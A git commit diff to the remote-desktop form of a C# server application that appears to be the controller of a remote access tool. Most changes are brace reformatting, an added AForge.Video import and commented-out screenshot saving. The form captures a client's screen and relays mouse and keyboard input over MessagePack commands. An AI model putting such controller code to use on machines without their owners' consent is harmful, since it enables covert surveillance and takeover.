38a71518ea898d939b58f559cf97a0ed47bd800d
Nguyễn Cao Nguyên <nguyencaonguyen0944322545@gmail.com>
2024-07-17 18:46:17 +0700

    Format and added AForge.Video to Server

--- Server/Forms/FormRemoteDesktop.cs
+++ Server/Forms/FormRemoteDesktop.cs
@@ -15,12 +15,11 @@ using Server.MessagePack;
 using System.Threading;
 using System.Drawing.Imaging;
 using System.IO;
+using AForge.Video;
 using Encoder = System.Drawing.Imaging.Encoder;
 
-namespace Server.Forms
-{
-    public partial class FormRemoteDesktop : Form
-    {
+namespace Server.Forms {
+    public partial class FormRemoteDesktop : Form {
         public Form1 F { get; set; }
         internal Clients ParentClient { get; set; }
         internal Clients Client { get; set; }
@@ -35,35 +34,28 @@ namespace Server.Forms
         public object syncPicbox = new object();
         private readonly List<Keys> _keysPressed;
         public Image GetImage { get; set; }
-        public FormRemoteDesktop()
-        {
+        public FormRemoteDesktop() {
             _keysPressed = new List<Keys>();
             InitializeComponent();
         }
 
 
-        private void timer1_Tick(object sender, EventArgs e)
-        {
-            try
-            {
+        private void timer1_Tick(object sender, EventArgs e) {
+            try {
                 if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) this.Close();
             }
             catch { this.Close(); }
         }
 
-        private void FormRemoteDesktop_Load(object sender, EventArgs e)
-        {
-            try
-            {
+        private void FormRemoteDesktop_Load(object sender, EventArgs e) {
+            try {
                 button1.Tag = (object)"stop";
             }
             catch { }
         }
 
-        private void Button1_Click(object sender, EventArgs e)
-        {
-            if (button1.Tag == (object)"play")
-            {
+        private void Button1_Click(object sender, EventArgs e) {
+            if (button1.Tag == (object)"play") {
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                 msgpack.ForcePathObject("Option").AsString = "capture";
@@ -78,11 +70,9 @@ namespace Server.Forms
                 button1.Tag = (object)"stop";
                 button1.BackgroundImage = Properties.Resources.stop__1_;
             }
-            else
-            {
+            else {
                 button1.Tag = (object)"play";
-                try
-                {
+                try {
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                     msgpack.ForcePathObject("Option").AsString = "stop";
@@ -97,21 +87,16 @@ namespace Server.Forms
             }
         }
 
-        private void BtnSave_Click(object sender, EventArgs e)
-        {
-            if (button1.Tag == (object)"stop")
-            {
-                if (timerSave.Enabled)
-                {
+        private void BtnSave_Click(object sender, EventArgs e) {
+            if (button1.Tag == (object)"stop") {
+                if (timerSave.Enabled) {
                     timerSave.Stop();
                     btnSave.BackgroundImage = Properties.Resources.save_image;
                 }
-                else
-                {
+                else {
                     timerSave.Start();
                     btnSave.BackgroundImage = Properties.Resources.save_image2;
-                    try
-                    {
+                    try {
                         if (!Directory.Exists(FullPath))
                             Directory.CreateDirectory(FullPath);
                         Process.Start(FullPath);
@@ -121,10 +106,8 @@ namespace Server.Forms
             }
         }
 
-        private void TimerSave_Tick(object sender, EventArgs e)
-        {
-            try
-            {
+        private void TimerSave_Tick(object sender, EventArgs e) {
+            /*try {
                 if (!Directory.Exists(FullPath))
                     Directory.CreateDirectory(FullPath);
                 Encoder myEncoder = Encoder.Quality;
@@ -136,28 +119,23 @@ namespace Server.Forms
                 myEncoderParameters?.Dispose();
                 myEncoderParameter?.Dispose();
             }
-            catch { }
+            catch { }*/
+
         }
 
-        private ImageCodecInfo GetEncoder(ImageFormat format)
-        {
+        private ImageCodecInfo GetEncoder(ImageFormat format) {
             ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
-            foreach (ImageCodecInfo codec in codecs)
-            {
-                if (codec.FormatID == format.Guid)
-                {
+            foreach (ImageCodecInfo codec in codecs) {
+                if (codec.FormatID == format.Guid) {
                     return codec;
                 }
             }
             return null;
         }
 
-        private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
-        {
-            try
-            {
-                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
-                {
+        private void PictureBox1_MouseDown(object sender, MouseEventArgs e) {
+            try {
+                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse) {
                     Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                     int button = 0;
                     if (e.Button == MouseButtons.Left)
@@ -177,12 +155,9 @@ namespace Server.Forms
             catch { }
         }
 
-        private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
-        {
-            try
-            {
-                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
-                {
+        private void PictureBox1_MouseUp(object sender, MouseEventArgs e) {
+            try {
+                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse) {
                     Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                     int button = 0;
                     if (e.Button == MouseButtons.Left)
@@ -202,12 +177,9 @@ namespace Server.Forms
             catch { }
         }
 
-        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
-        {
-            try
-            {
-                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
-                {
+        private void pictureBox1_MouseMove(object sender, MouseEventArgs e) {
+            try {
+                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse) {
                     Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
@@ -220,53 +192,42 @@ namespace Server.Forms
             catch { }
         }
 
-        private void Button3_Click(object sender, EventArgs e)
-        {
-            if (isMouse)
-            {
+        private void Button3_Click(object sender, EventArgs e) {
+            if (isMouse) {
                 isMouse = false;
                 btnMouse.BackgroundImage = Properties.Resources.mouse;
             }
-            else
-            {
+            else {
                 isMouse = true;
                 btnMouse.BackgroundImage = Properties.Resources.mouse_enable;
             }
             pictureBox1.Focus();
         }
 
-        private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
-        {
-            try
-            {
+        private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e) {
+            try {
                 GetImage?.Dispose();
-                ThreadPool.QueueUserWorkItem((o) =>
-                {
+                ThreadPool.QueueUserWorkItem((o) => {
                     Client?.Disconnected();
                 });
             }
             catch { }
         }
 
-        private void btnKeyboard_Click(object sender, EventArgs e)
-        {
-            if (isKeyboard)
-            {
+        private void btnKeyboard_Click(object sender, EventArgs e) {
+            if (isKeyboard) {
                 isKeyboard = false;
                 btnKeyboard.BackgroundImage = Properties.Resources.keyboard;
             }
-            else
-            {
+            else {
                 isKeyboard = true;
                 btnKeyboard.BackgroundImage = Properties.Resources.keyboard_on;
             }
             pictureBox1.Focus();
         }
 
-        private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
-        {
-            if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isKeyboard)
-            {
+        private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e) {
+            if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isKeyboard) {
                 if (!IsLockKey(e.KeyCode))
                     e.Handled = true;
 
@@ -284,10 +245,8 @@ namespace Server.Forms
             }
         }
 
-        private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
-        {
-            if (button1.Tag == (object)"stop" && pictureBox1.Image != null && this.ContainsFocus && isKeyboard)
-            {
+        private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e) {
+            if (button1.Tag == (object)"stop" && pictureBox1.Image != null && this.ContainsFocus && isKeyboard) {
                 if (!IsLockKey(e.KeyCode))
                     e.Handled = true;
 
@@ -302,8 +261,7 @@ namespace Server.Forms
             }
         }
 
-        private bool IsLockKey(Keys key)
-        {
+        private bool IsLockKey(Keys key) {
             return ((key & Keys.CapsLock) == Keys.CapsLock)
                    || ((key & Keys.NumLock) == Keys.NumLock)
                    || ((key & Keys.Scroll) == Keys.Scroll);
